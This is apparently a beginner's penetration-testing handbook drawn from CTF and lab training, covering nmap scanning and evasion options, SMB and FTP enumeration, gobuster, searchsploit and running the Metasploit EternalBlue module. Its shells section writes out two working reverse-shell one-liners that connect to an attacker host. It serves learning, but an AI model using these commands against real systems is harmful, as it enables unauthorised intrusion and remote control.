# **WELCOME**

Welcome to a CyberSecurity Beginner Handbook 📒: the Cybersecurity Starter's Treasure Trove!

Dive into a curated collection of knowledge, gleaned from learning platforms, CTF challenges, and personal exploration.

# **WALKTHROUGH**

Google is your friend! GOOGLE EVERYTHING! Even if it seems stupid... just Google it

<strong>I - is it alive?</strong>

Ping target to make sure you can reach it.

<strong>II - Scan server</strong>

With nmap, scan server:
 `nmap <IP-ADDRESS>`

Then do a a full port scan in the background while you look at what the quick scan yield `sudo nmap <IP ADD> -p- sV` (👈🏾 less stealthy)

💡 <i>Output result in a file, better for reporting/note taking </i>

<strong> III - Banner grabbing </strong>

this will be helpful later to look for vulnerabilities for specific service versions.

See `nc` and other tools like `whatweb` , `nmap` or `curl` for banner grabbing.

💡 <i>so far I have observed that although you can get banner at a specific port with ncI havent yet figured out a way to do the same with whatweb</i>

<strong> IV - Add default scripts to server scan</strong>

add the `-sC` option to the nmap command to run default scripts.

`nmap -sC -p <port>,<port> -oA nibbles_script_scan <IP ADDRESS>`

💡 <i>notice how you can limit the script to only a couple ports? THIS IS USEFUL WHEN YOU DONT WANT TO MAKE TOO MUCH NOISE AND WHEN YOU ALREADY KNOW THESES ARE THE ONLY PORTS RUNNING</i>


The goal of the previous 3 steps is to get more info about the server and service running; get version and then research exploits about it!. Then you can google or searchsploit the items found…

<strong>V - Directory Enumeration </strong>

Now let's attempt to discover and list the files and directories within a web server's file system.

* Check <strong>Robots.txt file (if exists)</strong>
* Ffuf
* goBuster


# **NMAP 🛠**

## **what is it**

- Audit the security aspects of networks
- Simulate penetration tests
- Check firewall and IDS settings and configurations
- Types of possible connections
- Network mapping
- Response analysis
- Identify open ports
- Vulnerability assessment as well.

ALWAYS STORE EVERY SINGLE SCAN - so that you can later use it for comparison, documentation and reporting

**basic command**

**1 -** `nmap <IP ADDRESS>`

***No option specified, will scan the 1000 most common ports by default.***

```
port 3389 is the default port for Remote Desktop Services and is an excellent indication that the target is a Windows machine.
port 22 (SSH) being available indicates that the target is running Linux/Unix, but this service can also be configured on Windows.</i>
```

**building on the basic command:**

**2-** `nmap -sV --open -oA result-file <TARGET-IP>`

***This scan will scan open ports and provide info about service such as versions and service name, then output result in result-file***

```
- `-open`: This option instructs `nmap` to only show hosts that have at least one open (responsive) port. In other words, it filters out hosts that are completely unresponsive or do not have any open ports.
- `oA`: This option specifies the output format and file naming for the scan results. The `oA` flag is followed by a filename prefix, which will be used to generate three different output files:
    - `filename.nmap`: This file contains human-readable output in a text format.
    - `filename.gnmap`: This is a grepable output format that can be used with tools like `grep` or scripting languages.
    - `filename.xml`: This is an XML output format which can be used for further analysis or parsing by other tools.
```

**3-** `nmap -p- --open -oA result-file 10.129.42.190`

***This will check for **any services running on non-standard ports** that our initial can may have missed. Since this scans all 65,535 TCP ports (because of -p-), it can take a long time to finish depending on the network. It will output the result into result-file***

## **Nmap output**

💡 ***Similarly, output options will follow the format: `-oX`  (where X is the output type.  **N** is normal output: **.nmap** extension, **G** is grepable output with **.gnmap** extension, **X** is XML output with **.xml** extension)***

ALSO we can covert to a more readable output like so:

`xsltproc target.xml -o target.html`

Here an example of converting nmap out into an HTML page:

1 - run the scan: `sudo nmap <IP-ADDRESS> -p- -oX <file-name>`  *filename only, dont add an extension

2 - convert it to html: `xsltproc <filename> -o <filename>.html`

3 - See the result 😃

## **Nmap scans**

💡 ***as a rule of thumb, the scaning options mostly follow the format: `-sX` (where X is usually the first char in a scan name Example: -sA ACK scan and -sS SYN scan)***

**`-Sc`** specify that nmap script should be used to try and obtain more detailed info.

**`-sV`** Performs a version scan. Will display service protocol, app name and version.

**`-p-`** we want to scan ALL 65 535 ports.

**`-D`**  Decoy scanning. Nmap generates various random IP addresses inserted into the IP header to disguise the origin of the packet sent.

***Example: `sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5`***
***generate random (`RND`) a specific number (for example: `5`) of IP addresses separated by a colon (`:`). Our real IP address is then randomly placed between the generated IP addresses***

**`-sU`** UDP scan. Can be combined to a TCP scan type like SYN (-sS), like so: **`-sSU`**

**`-sY`** **SCTP INIT** scan. SCTP INIT scan is the SCTP equivalent of a TCP SYN scan.

**`-F`** scan top 100 ports

**`-sn`**  disables port scanning. Instead of doing an ARP ping (3 way handshack with SYN, ACK, etc), it does an ICMP Echo requests (ping, ttl)

**`-sA`** **TCP ACK** Scan. It is used to map out
firewall rulesets, determining whether they are stateful or not and
which ports are filtered. (BETTER TO USE TO EVADE FIREWALL?)

***see example of use:***
***`sudo nmap <TARGET> -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace` and look at SENT and RCVD info.***

**`-sS`**  TCP **SYN** scan. (send SYN, wait for response: Either SYN/ACK to signify it s open or RST for non listener)

***Specify that we want to do an ARP ping (as opposed to option above). This is typically the default option when nothing is specified.***

**`-sT`**  TCP **Connect**  scan. Default when TCP SYN scan is not an option.

**`-PE`** performs the ping scan by using ICMP Echo requests

**`-Pn`** 🚅   deactivate the ICMP echo requests. This instructs Nmap not to perform the host discovery and scan the target **regardless of whether it responds to ping requests or not.**. Can help speed up the request.

**`--packet-trace`**  shows all packets sent and received

**`--reason`**  displays the reason for the specific result

**`-n`** 🚅 disable DNS resolution. Nmap will not attempt to resolve hostnames to IP addresses. This speeds up the process if DNS res is not necessary.

**`-sV`** get additional available information from the open ports. identify versions, service names, and details about our target.

**`--disable-arp-ping`** 🥷🚅 disable ARP ping  (see example of command `sudo nmap 10.129.2.28 -p 21 --packet-trace -Pn -n --disable-arp-ping`). This option disables ARP (Address Resolution Protocol) ping probes. ARP ping is a host discovery technique used to check if a host is active on a local network. Disabling it can be helpful when scanning remote hosts or in situations where ARP ping is not effective.
💡 ***ARP probles can be picked up by an IDS in some situations so disabling it may make our request more stealthy. Also makes request faster as nmap will not wait for a response.***

**`--source-port XX`** 🥷: This option specifies a source port of XX for outgoing packets. The source port is the port number used in the outgoing packets from Nmap.

 💡 ***Setting it to 53 makes it appear as if the traffic is DNS-related, which can be useful for evading certain firewall rules or detection mechanisms that allow DNS traffic.***

**`-oA something`** store the result in a file in all fomat starting with the name ‘something’

**`-iL`** Performs defined scans against targets in provided ‘list_of_hosts.list’ file (notice the extension of the file)

**`--top-ports=10`** Scans the specified top ports that have been defined as most frequent. (21, 22, 23, 25, 80, 110, 139, 443, 445, 3389)

**`-sT`** connect scan ******************************(More stealthy)******************************. uses the TCP three-way handshake to determine if a specific port on a target host is open or closed. The scan sends an `SYN` packet to the target port and waits for a response. It is considered open if the target port responds with an `SYN-ACK` packet and closed if it responds with an `RST` packet

**`--max-retries`** set # time nmap should try reaching a port

**`--stats-every=5s`**defining how periods of time the status should be shown

**`-v`** increase verbosity level: display more info

**`-vv`** max verbosity level LOL

**`-A`** Aggressive scanning.** Nmap will gather as much info as possible, combining multiple scan types and scripts into one command.

***example: `nmap -A -p445 10.129.42.253` (notice we have specified a port here; port 445!! )***

***will yield:***
***- service & version***
***- OS Detection***
***- Script Scaning* (will run a set of default scans from the nmap scripting engine NSE)***
***- traceroute & path disc* to help identify routers and devices along the path***

Example of output:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:29 EST
Nmap scan report for 10.129.42.253
Host is up (0.11s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 4.6.2
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

Host script results:
|_nbstat: NetBIOS name: GS-SVCSCAN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-02-25T21:30:06
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   111.62 ms 10.10.14.1
2   111.89 ms 10.129.42.253

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.72 seconds
```

**`--initial-rtt-timeout 50ms`**  Sets the specified time value as initial RTT timeout

**`--max-rtt-timeout 100ms`**

## **Nmap scripts**

**1 - CMD to run Default script:**

`sudo nmap <IP-ADD> -sC`

**2 - Run 1 specific script:**

with category only

`sudo nmap <target> --script <category>`

with script name

`nmap --script <script name> -p<port> <host>`

**3 - run multiple scripts with script name:**

`sudo nmap <target> --script <script-name>,<script-name>,...`

**4 - Grab the banner (fingerprinting a service):**

`nmap -sV --script=banner -p<port> <host>`

***💡 This can also be done with **NetCat** Like so: `nc -nv <target ip> <port>`***


**useful scripts**

**[http-enum](https://nmap.org/nsedoc/scripts/http-enum.html):** can be used to enumerate common web application directories

`nmap -sV --script=http-enum -oA nibbles_nmap_http_enum <IP-ADDRESS>`

Example output:

```
**Eli90@htb[/htb]$** nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190

Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:41 EST
Nmap scan report for 10.129.42.190
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd <REDACTED> ((Ubuntu))
|_http-server-header: Apache/<REDACTED> (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.23 seconds
```

💡 ***The output above is  an example of a useless result so if you get this, move on.***


**`banner`** To get the banner obviously

**`smtp-commands`** shows which commands we can use by interacting with the target smtp

**`vuln`**  find out vulnerabilities (THIS IS A SCRIPT CATEGORY) - more info here https://nmap.org/book/host-discovery-strategies.html

**`dns-nsid`** REtrieves information from a DNS server by requesting its nameserver ID (nsid) and asking for its id.server and version.bind values


## Port Statuses

| State | Description |
| --- | --- |
| open | This indicates that the connection to the scanned port has been established. These connections can be TCP connections, UDP datagrams as well as SCTP associations. |
| closed | When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an RST flag. This scanning method can also be used to determine if our target is alive or not. |
| filtered | Nmap cannot correctly identify whether the scanned port is open or closed because either no response is returned from the target for the port or we get an error code from the target.  (Error type 3, code 0,1,2,3,9,10,13) |
| unfiltered | This state of a port only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined whether it is open or closed. |
| open/filtered | If we do not get a response for a specific port, Nmap will set it to that state. This indicates that a firewall or packet filter may protect the port. |
| closed/filtered | This state only occurs in the IP ID idle scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall. |

# **NETCAT 🛠**

## What is it

abbreviated as "nc", the "Swiss Army knife" of networking tools due to its wide range of capabilities. it can accomplish the following:

* Network Connectivity: Establish TCP and UDP connections to remote hosts.
* Port Scanning:  determine which ports on a remote host are open and responsive.
* Banner Grabbing: retrieve banners and information from services running on open ports.
* File Transfer: transfer files between systems over a network connection.
* Reverse Shells: In cybersecurity assessments, Netcat can be used to create reverse shells.
* Proxying and Port Forwarding: Netcat can act as a proxy server or perform port forwarding.
* Chat Server: It can also function as a basic chat server

## Banner grabbing

`nc -nv 10.129.42.190 22`  (where **22** is the port!)

Breaking down the command:

- `nc`: This is the command to invoke the `netcat` tool, which is a versatile networking utility for reading from and writing to network connections.
- `nv`: These are options passed to `nc`:
    - `n`: Disables DNS resolution, preventing `nc` from attempting to resolve the IP address to a hostname.
    - `v`: Enables verbose mode, which displays more information about the connection process.
- `10.129.42.190`: This is the IP address of the target host that you want to establish a connection with.
- `22`: This is the port number you want to connect to. In this case, it's port `22`, which is typically used for SSH connections.

💡 ***You can also specify the source port your nc request should be coming from with **-p X**, where X is the port #***
# **FTP 🗃**

## What is it

Stands for **File Transfer Protocol**!
You will usually see it display in a **nmap** scan like this:

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Dec 19 23:50 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix
```

## Connect via FTP

Connect with the command:

`ftp -p <target IP>`

you terminal should go from **$** to **ftp>**

then enumerate content:

`ls` and `cd` to enter the older

**Download a file with the command** `get <file>`

end with

`exit`

# **SMB 🤝**

## What is it

SMB is service 🤝 , standING for **Sever Message Block**

- allows users and administrators to share folders and make them accessible remotely by other users
- Prevalent vector in windows machines
- Sensitive data, including credentials, can be in network file shares, and some SMB versions may be vulnerable to RCE exploits such as **[EternalBlue](https://www.avast.com/c-eternalblue)**

💡 ***NMAP has a script to enumerate samba!!!***


see below:

`nmap --script smb-os-discovery.nse -p<port> <target-IP>`

output of example `nmap --script smb-os-discovery.nse -p445 10.10.10.40` will be:

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-27 00:59 GMT
Nmap scan report for doctors.htb (10.10.10.40)
Host is up (0.022s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: CEO-PC
|   NetBIOS computer name: CEO-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-12-27T00:59:46+00:00

Nmap done: 1 IP address (1 host up) scanned in 2.71 seconds
```

You can see that the host runs **Windows 7**  under  **OS**

❗️**You can perform an aggressive scan with nmap against this particular service to find out more:**

Like this (wit param -A)

`nmap -A -p445 10.129.42.253`   - See Example of outpu in Nmap page.

## Exploit

**1 - Shares**

💡 **smbclient**

The goal of the exploit is to **Enumerate** & **interact** with **SMB shares**

**enumerate (LIST SMB Shares):**

`smbclient -N -L \\\\<target-IP>`

**-N** suppresses the password prompt.

**-L** specifies that we want to retrieve a list of available shares on the remote host

Example of output:

```
Eli90@htb[/htb]$ smbclient -N -L \\\\10.129.42.253
    Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers	users           Disk
	IPC$            IPC       IPC Service (gs-svcscan server (Samba, Ubuntu))SMB1 disabled -- no workgroup available
```

Everything with **$** (For example print$ or IPC$) are **default shares.**

We are interested in **Non Default Shares** (In this case users)

**Interact (CONNECT):**

`smbclient \\\\<Target-IP>\\<non default share>`

attempt to log in without password and do as a **guest** then `ls` as per below. If denied, then you will need a user and passord:

```
Eli90@htb[/htb]$ smbclient \\\\10.129.42.253\\users

Enter WORKGROUP\users's password:
Try "help" to get a list of possible commands.

smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*

smb: \> exit
```

if you have credentials log in like this:

`smbclient -U <user name> \\\\<target-Ip>\\users`

the `cd` and `ls` away. See an output example:

```
Eli90@htb[/htb]$ smbclient -U bob \\\\10.129.42.253\\usersEnter WORKGROUP\bob's password:
Try "help" to get a list of possible commands.

smb: \> ls
  .                                   D        0  Thu Feb 25 16:42:23 2021
  ..                                  D        0  Thu Feb 25 15:05:31 2021
  bob                                 D        0  Thu Feb 25 16:42:23 2021

		4062912 blocks of size 1024. 1332480 blocks available

smb: \> cd bob

smb: \bob\> ls
  .                                   D        0  Thu Feb 25 16:42:23 2021
  ..                                  D        0  Thu Feb 25 16:42:23 2021
  passwords.txt                       N      156  Thu Feb 25 16:42:23 2021

		4062912 blocks of size 1024. 1332480 blocks available

smb: \bob\> get passwords.txt
getting file \bob\passwords.txt of size 156 as passwords.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)

```

as for FTP, download file with `get`

`get <file.txt>`

# **GoBuster**

## What is it

GoBuster is a versatile tool that allows for performing DNS, vhost, and directory brute-forcing


💡 ***you can enumerate files and DIRECTORIES with gobuster!***

## GoBuster command

`gobuster dir -u <**http://**target-ip> -w <wordlist-path>`

**dir** enumerate DIECTORIES as mentioned.

`gobuster dns -d <target-domain.com> -w <wordlist-path>`

**dns + d** signify we are interested to see subdomains.

- For each generated subdomain, the tool sends DNS queries to the DNS server to check if the subdomain exists and maps to an IP address.
- If a subdomain is found to exist, the tool lists it as a result of the enumeration

example of output below:

```
Eli90@htb[/htb]$ gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Domain:     inlanefreight.com
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/SecLists/Discovery/DNS/namelist.txt
===============================================================
2020/12/17 23:08:55 Starting gobuster
===============================================================
Found: blog.inlanefreight.com
Found: customer.inlanefreight.com
Found: my.inlanefreight.com
Found: ns1.inlanefreight.com
Found: ns2.inlanefreight.com
Found: ns3.inlanefreight.com
===============================================================
2020/12/17 23:10:34 Finished
===============================================================
```

# **cURL 🛠**

## What is it

`cURL`, which stands for **"Client URL,"**  is a command-line tool and library for transferring data with URLs (Uniform Resource Locators).


💡***Also another thing I realized you get litterally get the code of a page with curl `curl http://<IP-ADDRESS>`***

It is widely used to interact with various internet protocols such as HTTP, HTTPS, FTP, FTPS, SCP, SFTP, LDAP, and more.

With `cURL`, you can send and receive data to and from servers using various protocols.

## Banner Grabbing with cURL

`curl -IL https://<domain-name.com>`

where:

- `I`: This flag tells `curl` to send an HTTP HEAD request. The HEAD method is similar to GET, but it only requests the headers of the response, not the actual content. This is useful when you want to retrieve metadata about a resource (such as its size, content type, etc.) without actually downloading the full content.
- `L`: This flag tells `curl` to follow any redirects. If the server responds with a redirection (HTTP status code 3xx), `curl` will automatically follow the redirect and show the headers of the final response.

example output:

```
Eli90@htb[/htb]$ curl -IL https://www.inlanefreight.comHTTP/1.1 200 OK
Date: Fri, 18 Dec 2020 22:24:05 GMT
Server: Apache/2.4.29 (Ubuntu)
Link: <https://www.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
Link: <https://www.inlanefreight.com/>; rel=shortlink
Content-Type: text/html; charset=UTF-8
```

# **EYEWITNESS 🛠**

## What is it:

EyeWitness is designed to take screenshots of websites provide some server header info, and identify default credentials if known.

EyeWitness is designed to run on **Kali** Linux. It will auto detect the file you give it with the -f flag as either being a text file with URLs on each new line, nmap xml output, or nessus xml output. The --timeout flag is completely optional, and lets you provide the max time to wait when trying to render and screenshot a web page.

See [github repo](https://github.com/RedSiege/EyeWitness)

# **Whatweb 🛠**

## what is it:

Helps extract the **version** of web servers, supporting **frameworks**, and **applications** using the command-line tool

## Basic command:

`whatweb <target-ip>`

Example output:

```
Eli90@htb[/htb]$ whatweb --no-errors 10.10.10.0/24http://10.10.10.11 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.11], PoweredBy[Red,nginx], Title[Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux], nginx[1.14.1]
http://10.10.10.100 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.100], Title[File Sharing Service]
http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]
http://10.10.10.247 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@cross-fit.htb], Frame, HTML5, HTTPServer[OpenBSD httpd], IP[10.10.10.247], JQuery[3.3.1], PHP[7.4.12], Script, Title[Fine Wines], X-Powered-By[PHP/7.4.12], X-UA-Compatible[ie=edge]

```

# **Searchsploit 🛠**

## What is it:

is a command-line tool that is part of the Exploit Database (EDB) project

we can use to search for public vulnerabilities/exploits for any application.

once installed, type command:


## Basic command:

`searchsploit <application name>`

example of output:

```
Eli90@htb[/htb]$ searchsploit openssh 7.2
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                                                        | linux/remote/40113.txt
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------

```

the output above means:

- **OpenSSH 2.3 < 7.7 - Username Enumeration**
    - Path: `linux/remote/45233.py`
    - Description: This exploit is related to username enumeration in OpenSSH versions 2.3 to 7.7. It likely allows an attacker to determine valid usernames on a remote system.

    and the **path** info provided on the right refers to the location of the exploit or vulnerability description within the Exploit Database (EDB) repository:

    `linux/remote/45233.py`: This path indicates that the exploit
     script is located in the "linux" directory, under the "remote"
    subdirectory, and the filename is "45233.py". This is a Python script
    targeting a remote vulnerability.

# **METASPLOIT FRAMEWORK  (MF) 🐙**


## What is it:

An excellent tool for Pentesters. It contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets.

Advantages of the MF:

* Running reconnaissance scripts to enumerate remote hosts and compromised targets

* Verification scripts to test the existence of a vulnerability without actually compromising the target

* Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets

* Many post-exploitation and pivoting tools


## Basic Command

To run the metasploit, we can use the **msfconsole** command like so:

`msfconsole`

then when it’s up and running search:

`search exploit eternalblue`  where **eternalblue** is the name of an exploit.

Example of output:

```
msf6 > search exploit eternalblue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description   -  ----                                           ---------------  ----     -----  -----------
<SNIP>
EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010
```

The output above shows that we found one exploit (**exploit/windows/smb/ms17_010_psexec**)

to use the exploit found, run:

`use exploit/windows/smb/ms17_010_psexec`

## configure your attack

then you will have to ensure **all the required options are SET.**

in our example, two options require to be set: **RHOSTS** and **RPORT**

see below, they are empty:

```
Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as

...SNIP...
```

you can set them with the `set`  command, where RHOSTS is the **IP of our target**  and RPORT standing for **Remote Port** specifies the port number that the Metasploit module will use to communicate with the target system over the network.

💡 ***per Chatgpt it should be set to **445** as this is the port where SMB service is typically run***


```
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
```

As you see above HTB also set**LHOST**  to **tun0.** This was probably required but not visible in the output before cause it was cut off.

**LHOST** is LOCAL HOST (Attacker’s machine); in this case, "tun0" likely refers to a network interface associated with a tunneled connection, such as a VPN or a network tunnel.

**tun0**: "tun0" is likely the name of a network interface
that represents a tunneling device. Tunnels are often used to create
secure, encrypted connections over an untrusted network, such as the
internet. In this scenario, "tun0" could represent a VPN connection or
another form of tunnel.


💡 ***By setting the `LHOST` option to the attacker's IP address***
***associated with the "tun0" interface, the Metasploit framework is***
***configured to listen for a connection back from the exploited target***
***through the specified tunnel. Once the target system is successfully***
***compromised and exploited, it will establish a connection to the***
***attacker's machine through the defined tunnel and IP address.***

## Start attack

Before starting you can check to ensure that **server is vulnerable** with

`check`

output:

```
msf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
```


💡 ***Note that not every exploit in the `Metasploit Framework` supports the `check` function.***

then finally start the attack with

`run` or  `exploit`  !!

## Remeber this:

- Pay attention to details:

what are you searching for? could be

`search <application name>` OR  `search <service-name>`  (Remember in HTB web exploit, you found the right vuln by searching **simple backup** and NOT **wordpress** so search all kinds of stuff.

- It s good to set **RHOSTS** and **RPORT** but it VERY IMPORTANT to also double check the other params that may have already been set.

For ex in HTB web exploit chall, the exploit had FILEPATH as default /**etc/passords** but the file you wanted was actually at **/flag.txt** (As specified in the excercie description) so again pay attention frien 🙂

# **SHELLS 🐚**

## what is it:

A reverse shell allows you to access a compromised host for control and remote code execution

💡 ***it s like maintaining an opening so you can continue to exploit through there***

**type of  Shell:**

| Shell | Description |
| --- | --- |
| Reverse Shell | Connects back to our system and gives us control through a reverse connection. |
| Bind Shell | Waits for us to connect to it and gives us control once we do. |
| Web Shell | Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output. |

## Reverse Shell

**pros**

- most common

- quickest & easiest

- **once vuln is found that allow remote code exec, start netcat listener on our machine**

**cons**

- fragile connection

- Lose cnnection of shell command is stopped or lose connection.

- will have to use initial exploit to execute rever shell again



**Implementation steps:**

**1 - start nc listener on port of your choosing:**

For this we use `nc`

```
Eli90@htb[/htb]$ nc -lvnp 1234
listening on [any] 1234 ...
```

| Flag | Description |
| --- | --- |
| -l | Listen mode, to wait for a connection to connect to us. |
| -v | Verbose mode, so that we know when we receive a connection. |
| -n | Disable DNS resolution and only connect from/to IPs, to speed up the connection. |
| -p 1234 | Port number netcat is listening on, and the reverse connection should be sent to. |

**2 - Listener is set up (above) - Connect back to it.**

- Find your IP address (`ifconfig` look for ip under network interface up and running, either ‘eth’ or ‘wl…’)

- Execute reverse shell commands:

Depending on target OS (windows or kinux), executable commands will differ. See [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) for comprehensive list of reverse comands.

**Option 1:**

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

```

This command appears to be a Bash one-liner that creates a reverse shell connection to a specified IP address and port. Let me break it down for you:

1. `bash -c`: This is used to execute the following command in a new Bash shell.
2. `'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`: This is the command being executed within the new shell. Let's break it down further:
    - `bash -i`: This runs Bash in interactive mode, allowing for user input.
    - `>& /dev/tcp/10.10.10.10/1234`: This part sets up a redirection of both standard output (stdout) and standard error (stderr) to a TCP connection. `/dev/tcp` is a special filesystem in Unix-like systems that allows you to create connections using special files.
    - `0>&1`: This part redirects standard input (stdin) to the same TCP connection. It ensures that the input from the remote host (where the reverse shell is established) is redirected to the command being executed.

When this command is executed, it effectively creates a reverse shell connection to the IP address `10.10.10.10` on port `1234`. This means that if a listener is set up on the specified IP and port, the remote machine will establish a shell session back to that listener, effectively allowing remote control over the target machine.

**Option 2:**

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.2 9443 >/tmp/f

```

is another example of a shell command that establishes a reverse shell connection to a specified IP address and port. Let's break down the command step by step:

1. `rm /tmp/f`: This command attempts to remove a file named "f" in the "/tmp" directory. This is done to ensure that the subsequent command does not fail due to the file already existing.
2. `mkfifo /tmp/f`: This creates a named pipe (FIFO) named "f" in the "/tmp" directory. Named pipes are used to establish communication between processes.
3. `cat /tmp/f|/bin/sh -i 2>&1`: This part of the command sets up a pipeline. It reads the content from the named pipe "f" and sends it to the standard input of the `/bin/sh` shell with the `i` flag (interactive mode). The `2>&1` redirects the standard error (file descriptor 2) to the same location as standard output (file descriptor 1), ensuring that any error messages are included in the communication.
4. `nc 10.10.10.10 1234 >/tmp/f`: This part uses the `nc` command (netcat) to establish a connection to the IP address `10.10.10.10` on port `1234`. The output of the shell process started in the previous step is redirected to the named pipe "f" in the "/tmp" directory.

